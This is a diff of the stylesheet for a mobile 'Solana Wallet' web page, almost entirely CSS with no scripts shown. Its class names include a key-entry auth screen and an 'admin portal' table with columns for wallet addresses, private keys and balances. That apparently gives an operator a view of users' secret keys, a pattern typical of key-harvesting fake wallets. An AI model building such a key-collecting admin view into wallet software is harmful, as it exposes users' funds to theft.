@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-  <title>Solana Wallet</title>
+  <title>Solana Wallet | Secure Crypto Wallet</title>
   
   <!-- PWA Meta Tags -->
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -23,14 +23,31 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { background: #0A0C12; font-family: 'Inter', sans-serif; color: #FFFFFF; overflow-x: hidden; }
     
-    /* Prevent pinch zoom on iOS and Android */
     html, body {
       -webkit-text-size-adjust: 100%;
       text-size-adjust: 100%;
       overflow-x: hidden;
-      position: fixed;
       width: 100%;
       height: 100%;
+    }
+
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 10px; }
+    ::-webkit-scrollbar-thumb { background: rgba(20,241,149,0.3); border-radius: 10px; }
+
+    @keyframes fadeSlideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.2); }
+    }
+
+    @keyframes tickerScroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
     }
 
     .top-bar {
@@ -39,16 +56,20 @@
       position: sticky;
       top: 0;
       z-index: 10;
-      overflow: hidden;
       height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-right: 12px;
     }
 
     .news-ticker {
-      width: 100%;
-      height: 100%;
+      flex: 1;
       display: flex;
       align-items: center;
       background: #000000;
+      overflow: hidden;
+      height: 100%;
     }
 
     .ticker-label {
@@ -62,6 +83,7 @@
       white-space: nowrap;
       z-index: 2;
       color: white;
+      flex-shrink: 0;
     }
 
     .ticker-wrapper {
@@ -74,7 +96,7 @@
     .ticker-content {
       position: absolute;
       white-space: nowrap;
-      animation: tickerScroll 60s linear infinite;
+      animation: tickerScroll 80s linear infinite;
       font-size: 13px;
       font-weight: 500;
       color: #E5E7EB;
@@ -84,9 +106,26 @@
     .ticker-content span { margin-right: 48px; display: inline-block; }
     .ticker-content span::before { content: "⚡"; margin-right: 8px; color: #14F195; }
 
-    @keyframes tickerScroll {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-50%); }
+    /* Network Status - Right side, not overlapping */
+    .network-status {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(20,241,149,0.1);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 10px;
+      color: #14F195;
+      white-space: nowrap;
+      flex-shrink: 0;
+      margin-left: 8px;
+    }
+    .status-dot {
+      width: 6px;
+      height: 6px;
+      background: #14F195;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
     }
 
     .app-wrapper {
@@ -101,6 +140,7 @@
       -webkit-overflow-scrolling: touch;
     }
 
+    /* Auth Screen */
     .auth-screen {
       position: fixed;
       top: 0;
@@ -125,6 +165,7 @@
       max-width: 380px;
       border: 1px solid rgba(255,255,255,0.08);
       box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+      animation: fadeSlideUp 0.5s ease;
     }
 
     .auth-subtitle {
@@ -162,8 +203,9 @@
       margin-bottom: 8px;
       cursor: pointer;
       transition: all 0.2s;
+      border: 1px solid rgba(255,255,255,0.05);
     }
-    .auth-news-item:hover { background: rgba(26,30,42,0.8); transform: translateX(4px); }
+    .auth-news-item:hover { background: rgba(26,30,42,0.8); transform: translateX(4px); border-color: rgba(20,241,149,0.3); }
     .auth-news-item-title { font-size: 12px; font-weight: 500; color: white; margin-bottom: 4px; }
     .auth-news-item-source { font-size: 9px; color: #6C727F; }
 
@@ -179,6 +221,7 @@
       outline: none;
       font-family: monospace;
       resize: vertical;
+      transition: all 0.2s;
     }
     .auth-input:focus { border-color: #14F195; }
 
@@ -196,6 +239,7 @@
       transition: all 0.2s;
     }
     .auth-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(20,241,149,0.3); }
+    .auth-btn:active { transform: scale(0.96); }
     .auth-btn-secondary { background: transparent; border: 1px solid rgba(20,241,149,0.5); }
 
     .divider {
@@ -208,6 +252,7 @@
     .divider-text { font-size: 12px; color: #6B7280; }
     .warning-text { font-size: 10px; color: #F23B5C; text-align: center; margin-top: 16px; }
 
+    /* Main App */
     .main-app { 
       display: none; 
       height: 100%;
@@ -229,12 +274,13 @@
     
     .page { 
       width: 50%; 
-      padding-bottom: 90px;
+      padding-bottom: 85px;
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
       height: calc(100vh - 44px);
     }
 
+    /* Wallet Header */
     .wallet-header {
       display: flex;
       justify-content: space-between;
@@ -244,7 +290,9 @@
       position: sticky;
       top: 0;
       z-index: 5;
+      border-bottom: 0.5px solid rgba(255,255,255,0.05);
     }
+    
     .account-selector {
       display: flex;
       align-items: center;
@@ -254,9 +302,12 @@
       border-radius: 40px;
       cursor: pointer;
       border: 1px solid rgba(255,255,255,0.1);
+      transition: all 0.2s;
     }
+    .account-selector:hover { border-color: #14F195; }
     .account-selector span { font-size: 14px; font-weight: 500; color: white; }
     .account-selector svg { width: 16px; height: 16px; stroke: #14F195; fill: none; }
+    
     .wallet-actions { display: flex; gap: 12px; }
     .wallet-action-btn {
       background: #1A1E2A;
@@ -270,8 +321,505 @@
       display: flex;
       align-items: center;
       gap: 6px;
+      transition: all 0.2s;
     }
-    .wallet-action-btn svg { width: 14px; height: 14px; stroke: #8E8E93; }
+    .wallet-action-btn:hover { border-color: #14F195; color: #14F195; }
+    .wallet-action-btn svg { width: 14px; height: 14px; stroke: currentColor; }
+
+    .glass-card {
+      background: rgba(18,22,30,0.75);
+      backdrop-filter: blur(20px);
+      border-radius: 32px;
+      border: 0.5px solid rgba(255,255,255,0.08);
+      margin: 16px 20px;
+      padding: 20px 18px;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .balance-section { text-align: center; padding: 20px 20px 12px; }
+    .balance-label { 
+      font-size: 13px; 
+      font-weight: 500; 
+      color: #9CA3AF; 
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+    .main-balance {
+      font-size: 52px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+      background: linear-gradient(135deg, #FFFFFF, #E0E4FF);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .sol-sub { 
+      font-size: 16px; 
+      font-weight: 500; 
+      color: #6B7280; 
+      margin-top: 8px;
+    }
+    .address-hash {
+      font-size: 11px;
+      color: #14F195;
+      margin-top: 8px;
+      font-family: monospace;
+      word-break: break-all;
+      background: rgba(20,241,149,0.1);
+      padding: 8px 16px;
+      border-radius: 20px;
+      display: inline-block;
+      max-width: 90%;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .address-hash:hover { background: rgba(20,241,149,0.2); transform: scale(1.02); }
+
+    .action-row {
+      display: flex;
+      gap: 12px;
+      padding: 16px 20px;
+    }
+    .action-btn {
+      flex: 1;
+      background: #1A1E2A;
+      padding: 14px;
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 1px solid rgba(255,255,255,0.1);
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 16px;
+      color: white;
+      transition: all 0.2s;
+    }
+    .action-btn:active { transform: scale(0.96); background: #2A2E3E; }
+    .action-btn svg { stroke: #14F195; stroke-width: 1.8; fill: none; }
+
+    .chart-card {
+      margin: 16px 20px 20px;
+      background: linear-gradient(145deg, #13161F, #0F1119);
+      border-radius: 36px;
+      padding: 18px;
+      border: 1px solid rgba(88,102,126,0.25);
+    }
+
+    .chart-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .coin-title { display: flex; align-items: center; gap: 12px; }
+    .coin-icon-small {
+      width: 40px;
+      height: 40px;
+      background: #1E1F2C;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .coin-icon-small img { width: 28px; height: 28px; object-fit: contain; }
+    .coin-name { font-weight: 700; font-size: 18px; }
+    .price-info { text-align: right; }
+    .current-price { font-size: 22px; font-weight: 700; }
+    .price-change { font-size: 13px; font-weight: 500; padding: 2px 8px; border-radius: 30px; display: inline-block; }
+    .price-change.positive { color: #22C55E; background: rgba(34,197,94,0.12); }
+    .price-change.negative { color: #F23B5C; background: rgba(242,59,92,0.12); }
+    .chart-container { margin-top: 12px; width: 100%; height: 160px; position: relative; }
+    canvas { width: 100%; height: 100%; display: block; }
+    .timeframes {
+      display: flex;
+      gap: 12px;
+      margin-top: 16px;
+      justify-content: center;
+    }
+    .tf-btn {
+      font-size: 12px;
+      font-weight: 500;
+      color: #6B7280;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 6px 12px;
+      border-radius: 20px;
+      transition: all 0.2s;
+    }
+    .tf-btn.active { 
+      color: #14F195; 
+      background: rgba(20,241,149,0.1);
+    }
+
+    .token-list { margin-top: 4px; padding: 0 20px 20px 20px; }
+    .token-row {
+      background: #131722;
+      padding: 16px;
+      border-radius: 24px;
+      margin-bottom: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .token-row:hover {
+      transform: translateX(6px);
+      border-color: rgba(20,241,149,0.3);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+    .token-row:active { transform: scale(0.98); }
+    
+    .token-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .token-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 28px;
+      background: linear-gradient(135deg, #1E1F2C, #13161F);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .token-icon img { width: 32px; height: 32px; object-fit: contain; }
+    .token-name { font-weight: 700; font-size: 17px; }
+    .token-balance { font-weight: 600; font-size: 16px; color: white; margin-top: 4px; }
+    .token-value { font-size: 15px; font-weight: 600; color: #14F195; }
+
+    /* Token Detail Modal */
+    .token-detail-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(12px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 400;
+    }
+    .token-detail-modal.active { display: flex; }
+    .token-detail-content {
+      background: linear-gradient(135deg, #1A1E2A, #131722);
+      border-radius: 48px;
+      padding: 24px;
+      width: 90%;
+      max-width: 380px;
+      border: 1px solid rgba(20,241,149,0.3);
+      animation: fadeSlideUp 0.3s ease;
+    }
+    .token-detail-header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+    .token-detail-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #1E1F2C, #13161F);
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .token-detail-icon img { width: 48px; height: 48px; }
+    .token-detail-info h3 { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+    .token-detail-info p { font-size: 14px; color: #8E8E93; }
+    .detail-chart { width: 100%; height: 200px; margin: 20px 0; }
+    .detail-stats {
+      display: flex;
+      justify-content: space-between;
+      padding: 16px 0;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .detail-stat { text-align: center; flex: 1; }
+    .detail-stat-label { font-size: 11px; color: #8E8E93; margin-bottom: 4px; }
+    .detail-stat-value { font-size: 16px; font-weight: 700; color: #14F195; }
+    .close-detail-btn {
+      width: 100%;
+      background: #2A2E42;
+      border: none;
+      padding: 14px;
+      border-radius: 32px;
+      color: white;
+      font-weight: 600;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .tx-item {
+      padding: 14px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .tx-item:hover { background: rgba(20,241,149,0.05); transform: translateX(4px); }
+    .tx-left { flex: 1; }
+    .tx-type { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
+    .tx-date { font-size: 11px; color: #6C727F; margin-top: 4px; margin-left: 26px; }
+    .tx-amount { font-weight: 600; text-align: right; color: #14F195; }
+    .tx-hash { font-size: 10px; color: #14F195; margin-top: 2px; margin-left: 26px; font-family: monospace; }
+
+    .news-section { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
+    .news-item {
+      background: rgba(26,30,42,0.6);
+      border-radius: 20px;
+      padding: 16px;
+      cursor: pointer;
+      transition: all 0.2s;
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .news-item:hover {
+      background: rgba(26,30,42,0.9);
+      transform: translateX(4px);
+      border-color: rgba(20,241,149,0.3);
+    }
+    .news-title { font-size: 14px; font-weight: 600; color: white; margin-bottom: 8px; line-height: 1.4; }
+    .news-meta { display: flex; align-items: center; justify-content: space-between; }
+    .news-source { font-size: 11px; color: #14F195; display: flex; align-items: center; gap: 6px; }
+    .news-date { font-size: 10px; color: #6C727F; }
+
+    .bottom-tabs {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-width: 480px;
+      margin: 0 auto;
+      background: rgba(10,12,18,0.98);
+      backdrop-filter: blur(20px);
+      display: flex;
+      justify-content: space-around;
+      padding: 8px 24px 18px;
+      border-top: 0.5px solid rgba(255,255,255,0.08);
+      z-index: 20;
+    }
+    .tab-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      font-size: 11px;
+      color: #6B7280;
+      cursor: pointer;
+      transition: all 0.2s;
+      padding: 6px 12px;
+      border-radius: 30px;
+    }
+    .tab-item.active { color: #14F195; background: rgba(20,241,149,0.1); }
+    .tab-icon { width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; }
+    .tab-icon svg { width: 20px; height: 20px; stroke: currentColor; stroke-width: 1.8; fill: none; }
+
+    .toast-notification {
+      position: fixed;
+      bottom: 85px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #14F195;
+      color: #000000;
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-weight: 600;
+      z-index: 200;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+      white-space: nowrap;
+    }
+    .toast-notification.show { opacity: 1; }
+
+    /* Custom Alert Modal */
+    .custom-alert {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(12px);
+      z-index: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: all 0.2s;
+    }
+    .custom-alert.active { visibility: visible; opacity: 1; }
+    .custom-alert-content {
+      background: linear-gradient(135deg, #1A1E2A, #131722);
+      border-radius: 32px;
+      padding: 24px;
+      width: 90%;
+      max-width: 340px;
+      border: 1px solid rgba(20,241,149,0.3);
+    }
+    .custom-alert-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      text-align: center;
+      color: #14F195;
+    }
+    .custom-alert-message {
+      font-size: 13px;
+      color: #E5E7EB;
+      margin-bottom: 24px;
+      text-align: center;
+      word-break: break-word;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .custom-alert-buttons {
+      display: flex;
+      gap: 12px;
+    }
+    .custom-alert-btn {
+      flex: 1;
+      background: #14F195;
+      border: none;
+      padding: 12px;
+      border-radius: 28px;
+      color: black;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .copy-section {
+      background: #0F131C;
+      border-radius: 16px;
+      padding: 12px;
+      margin: 12px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .copy-section-text {
+      font-family: monospace;
+      font-size: 10px;
+      word-break: break-all;
+      flex: 1;
+      color: #8E8E93;
+    }
+    .copy-section-btn {
+      background: #2A2E42;
+      border: none;
+      color: #14F195;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 10px;
+      cursor: pointer;
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.9);
+      backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 300;
+    }
+    .modal.active { display: flex; }
+    .swap-modal-content, .modal-content {
+      background: #131722;
+      padding: 24px;
+      border-radius: 32px;
+      width: 90%;
+      max-width: 340px;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .swap-field {
+      background: #0F131C;
+      padding: 16px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+    }
+    .swap-field small { color: #8E8E93; font-size: 12px; display: block; margin-bottom: 8px; }
+    .swap-field .field-row { display: flex; justify-content: space-between; align-items: center; }
+    .swap-field .amount-input {
+      font-size: 20px;
+      font-weight: 600;
+      background: transparent;
+      border: none;
+      color: white;
+      width: 70%;
+      outline: none;
+    }
+    .swap-token-select {
+      background: #1A1E2A;
+      border: none;
+      color: white;
+      padding: 6px 12px;
+      border-radius: 30px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .swap-arrow {
+      text-align: center;
+      font-size: 28px;
+      margin: 12px 0;
+      color: #14F195;
+      cursor: pointer;
+    }
+    .swap-preview {
+      text-align: center;
+      margin: 16px 0;
+      padding: 12px;
+      background: #0F131C;
+      border-radius: 20px;
+      color: #8E8E93;
+      font-size: 14px;
+    }
+    .swap-btn, .modal-btn {
+      width: 100%;
+      padding: 14px;
+      background: #14F195;
+      border: none;
+      border-radius: 30px;
+      font-weight: 600;
+      font-size: 16px;
+      cursor: pointer;
+      color: black;
+    }
+    .close-modal-btn, .modal-btn-secondary {
+      width: 100%;
+      padding: 12px;
+      background: #2A2E42;
+      border: none;
+      border-radius: 30px;
+      color: white;
+      font-weight: 500;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+    .modal-title { font-size: 20px; font-weight: 600; margin-bottom: 20px; text-align: center; }
+    .modal-input {
+      width: 100%;
+      background: #0F131C;
+      border: 1px solid rgba(255,255,255,0.15);
+      padding: 14px 18px;
+      border-radius: 28px;
+      color: white;
+      font-size: 14px;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    .modal-input:focus { border-color: #14F195; }
 
     .account-modal {
       position: fixed;
@@ -321,10 +869,7 @@
       border-radius: 20px;
       font-size: 11px;
       cursor: pointer;
-      margin-left: 8px;
-      transition: all 0.2s;
     }
-    .view-private-key-btn:hover { background: #3A3E52; }
     .add-account-btn {
       width: 100%;
       background: linear-gradient(135deg, #14F195, #0E9F6E);
@@ -337,408 +882,9 @@
       margin-top: 12px;
     }
 
-    .glass-card {
-      background: rgba(18,22,30,0.75);
-      backdrop-filter: blur(20px);
-      border-radius: 32px;
-      border: 0.5px solid rgba(255,255,255,0.08);
-      margin: 16px 20px;
-      padding: 20px 18px;
-    }
-
-    .balance-section { text-align: center; padding: 20px 20px 12px; }
-    .balance-label { font-size: 15px; font-weight: 500; color: #9CA3AF; margin-bottom: 8px; }
-    .main-balance {
-      font-size: 48px;
-      font-weight: 700;
-      letter-spacing: -1px;
-      background: linear-gradient(135deg, #FFFFFF, #D1D5F0);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
-    .sol-sub { font-size: 16px; font-weight: 500; color: #6B7280; margin-top: 8px; }
-    .address-hash {
-      font-size: 11px;
-      color: #14F195;
-      margin-top: 8px;
-      font-family: monospace;
-      word-break: break-all;
-      background: rgba(20,241,149,0.1);
-      padding: 8px 16px;
-      border-radius: 20px;
-      display: inline-block;
-      max-width: 90%;
-    }
-
-    .action-row {
-      display: flex;
-      gap: 12px;
-      padding: 16px;
-    }
-    .action-btn {
-      flex: 1;
-      background: #1A1E2A;
-      padding: 14px;
-      border-radius: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      border: 1px solid rgba(255,255,255,0.1);
-      cursor: pointer;
-      font-weight: 600;
-      font-size: 16px;
-      color: white;
-      transition: all 0.2s;
-    }
-    .action-btn:active { transform: scale(0.96); background: #2A2E3E; }
-    .action-btn svg { stroke: #14F195; stroke-width: 1.8; fill: none; }
-
-    .chart-card {
-      margin: 16px 20px 20px;
-      background: linear-gradient(145deg, #13161F, #0F1119);
-      border-radius: 36px;
-      padding: 18px 18px 12px;
-      border: 1px solid rgba(88,102,126,0.25);
-    }
-
-    .chart-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
-    .coin-title { display: flex; align-items: center; gap: 12px; }
-    .coin-icon-small {
-      width: 40px;
-      height: 40px;
-      background: #1E1F2C;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .coin-icon-small img { width: 28px; height: 28px; object-fit: contain; }
-    .coin-name { font-weight: 700; font-size: 18px; }
-    .price-info { text-align: right; }
-    .current-price { font-size: 22px; font-weight: 700; }
-    .price-change { font-size: 13px; font-weight: 500; padding: 2px 8px; border-radius: 30px; display: inline-block; }
-    .price-change.positive { color: #22C55E; background: rgba(34,197,94,0.12); }
-    .price-change.negative { color: #F23B5C; background: rgba(242,59,92,0.12); }
-    .chart-container { margin-top: 12px; width: 100%; height: 140px; position: relative; }
-    canvas { width: 100%; height: 100%; display: block; }
-    .timeframes { display: flex; gap: 16px; margin-top: 18px; justify-content: space-between; }
-    .tf-btn {
-      font-size: 13px;
-      font-weight: 500;
-      color: #6B7280;
-      background: transparent;
-      border: none;
-      cursor: pointer;
-      padding: 4px 0;
-    }
-    .tf-btn.active { color: white; border-bottom: 2px solid #14F195; }
-
-    .token-list {
-      margin-top: 4px;
-    }
-    .token-row {
-      background: #131722;
-      padding: 16px;
-      border-radius: 20px;
-      margin-bottom: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .token-left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .token-icon {
-      width: 44px;
-      height: 44px;
-      border-radius: 28px;
-      background: #1E1F2C;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .token-icon img { width: 32px; height: 32px; object-fit: contain; }
-    .token-name-section {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .token-name {
-      font-weight: 600;
-      font-size: 17px;
-    }
-    .verify-badge svg {
-      width: 20px;
-      height: 20px;
-    }
-    .token-balance {
-      font-weight: 600;
-      font-size: 15px;
-      color: white;
-    }
-    .token-right {
-      text-align: right;
-    }
-    .token-value {
-      font-size: 15px;
-      font-weight: 600;
-      color: white;
-    }
-
-    .tx-item {
-      padding: 14px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.05);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .tx-item:hover { background: rgba(20,241,149,0.05); }
-    .tx-left { flex: 1; }
-    .tx-type { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
-    .tx-icon { font-size: 18px; }
-    .tx-date { font-size: 11px; color: #6C727F; margin-top: 4px; margin-left: 26px; }
-    .tx-amount { font-weight: 600; text-align: right; color: #14F195; }
-    .tx-hash { font-size: 10px; color: #14F195; margin-top: 2px; margin-left: 26px; font-family: monospace; }
-
-    .news-section {
-      margin-top: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .news-item {
-      background: rgba(26,30,42,0.6);
-      border-radius: 20px;
-      padding: 16px;
-      cursor: pointer;
-      transition: all 0.2s;
-      border: 1px solid rgba(255,255,255,0.05);
-    }
-    .news-item:hover {
-      background: rgba(26,30,42,0.9);
-      transform: translateX(4px);
-      border-color: rgba(20,241,149,0.3);
-    }
-    .news-title {
-      font-size: 14px;
-      font-weight: 600;
-      color: white;
-      margin-bottom: 8px;
-      line-height: 1.4;
-    }
-    .news-meta {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .news-source {
-      font-size: 11px;
-      color: #14F195;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .news-date {
-      font-size: 10px;
-      color: #6C727F;
-    }
-
-    .bottom-tabs {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      max-width: 480px;
-      margin: 0 auto;
-      background: rgba(10,12,18,0.96);
-      backdrop-filter: blur(20px);
-      display: flex;
-      justify-content: space-around;
-      padding: 12px 24px 22px;
-      border-top: 0.5px solid rgba(255,255,255,0.08);
-      z-index: 20;
-    }
-    .tab-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      font-size: 12px;
-      color: #6B7280;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .tab-item.active { color: #14F195; }
-    .tab-icon {
-      width: 24px;
-      height: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .tab-icon svg {
-      width: 22px;
-      height: 22px;
-      stroke: currentColor;
-      stroke-width: 1.8;
-      fill: none;
-    }
-    .tab-item.active .tab-icon svg {
-      stroke: #14F195;
-    }
-
-    .toast-notification {
-      position: fixed;
-      bottom: 100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #14F195;
-      color: #000000;
-      padding: 12px 24px;
-      border-radius: 40px;
-      font-weight: 600;
-      z-index: 200;
-      opacity: 0;
-      transition: opacity 0.3s;
-      pointer-events: none;
-      white-space: nowrap;
-    }
-    .toast-notification.show { opacity: 1; }
-
-    .modal {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.9);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 300;
-    }
-    .modal.active { display: flex; }
-    .swap-modal-content {
-      width: 90%;
-      max-width: 360px;
-      background: #131722;
-      padding: 24px;
-      border-radius: 32px;
-    }
-    .swap-field {
-      background: #0F131C;
-      padding: 16px;
-      border-radius: 20px;
-      margin-bottom: 16px;
-    }
-    .swap-field small {
-      color: #8E8E93;
-      font-size: 12px;
-      display: block;
-      margin-bottom: 8px;
-    }
-    .swap-field .field-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .swap-field .amount-input {
-      font-size: 20px;
-      font-weight: 600;
-      background: transparent;
-      border: none;
-      color: white;
-      width: 70%;
-      outline: none;
-    }
-    .swap-token-select {
-      background: #1A1E2A;
-      border: none;
-      color: white;
-      padding: 6px 12px;
-      border-radius: 30px;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .swap-arrow {
-      text-align: center;
-      font-size: 28px;
-      margin: 12px 0;
-      color: #14F195;
-      cursor: pointer;
-      transition: transform 0.2s;
-    }
-    .swap-arrow:active { transform: scale(1.1); }
-    .swap-preview {
-      text-align: center;
-      margin: 16px 0;
-      padding: 12px;
-      background: #0F131C;
-      border-radius: 20px;
-      color: #8E8E93;
-      font-size: 14px;
-    }
-    .swap-btn {
-      width: 100%;
-      padding: 14px;
-      background: #14F195;
-      border: none;
-      border-radius: 30px;
-      font-weight: 600;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 8px;
-      color: black;
-    }
-    .close-modal-btn {
-      width: 100%;
-      padding: 12px;
-      background: #2A2E42;
-      border: none;
-      border-radius: 30px;
-      color: white;
-      font-weight: 500;
-      margin-top: 12px;
-      cursor: pointer;
-    }
-    .modal-content {
-      background: #1A1E2A;
-      border-radius: 32px;
-      padding: 24px;
-      width: 90%;
-      max-width: 340px;
-    }
-    .modal-title { font-size: 20px; font-weight: 600; margin-bottom: 20px; text-align: center; }
-    .modal-input {
-      width: 100%;
-      background: #0F131C;
-      border: 1px solid rgba(255,255,255,0.15);
-      padding: 16px 18px;
-      border-radius: 28px;
-      color: white;
-      font-size: 16px;
-      margin-bottom: 16px;
-      outline: none;
-    }
-    .modal-input:focus { border-color: #14F195; }
-    .modal-btn {
-      background: #14F195;
-      border: none;
-      padding: 14px;
-      border-radius: 28px;
-      color: black;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-    }
-    .modal-btn-secondary { background: #2A2E42; color: white; margin-top: 12px; }
-
     .admin-float-btn {
       position: fixed;
-      bottom: 100px;
+      bottom: 85px;
       right: 16px;
       background: rgba(26,30,42,0.9);
       backdrop-filter: blur(10px);
@@ -750,7 +896,9 @@
       border: 1px solid rgba(20,241,149,0.3);
       color: #8E8E93;
       font-weight: 500;
+      transition: all 0.2s;
     }
+    .admin-float-btn:hover { border-color: #14F195; color: #14F195; }
 
     .admin-portal {
       position: fixed;
@@ -775,30 +923,114 @@
       z-index: 10;
     }
     .admin-header h3 { font-size: 18px; color: #14F195; }
-    .close-admin { background: #F23B5C; border: none; padding: 8px 20px; border-radius: 30px; color: white; cursor: pointer; }
-    .admin-table { padding: 16px; overflow-x: auto; }
-    table { width: 100%; border-collapse: collapse; font-size: 12px; background: #0A0C12; }
-    th, td { padding: 12px 8px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); vertical-align: middle; }
-    th { color: #14F195; font-weight: 600; font-size: 13px; background: rgba(20,241,149,0.1); position: sticky; top: 0; }
-    .wallet-row { transition: all 0.2s; }
-    .wallet-row:hover { background: rgba(20,241,149,0.05); }
-    .address-cell { font-family: monospace; font-size: 11px; word-break: break-all; max-width: 200px; }
-    .key-cell { font-family: monospace; font-size: 10px; word-break: break-all; max-width: 250px; background: rgba(0,0,0,0.3); padding: 6px; border-radius: 8px; }
-    .balance-cell { font-weight: 600; color: #14F195; font-size: 13px; }
-    .copy-btn { 
-      background: #1A1E2A; 
-      border: none; 
-      color: #14F195; 
-      padding: 4px 10px; 
-      border-radius: 8px; 
-      cursor: pointer; 
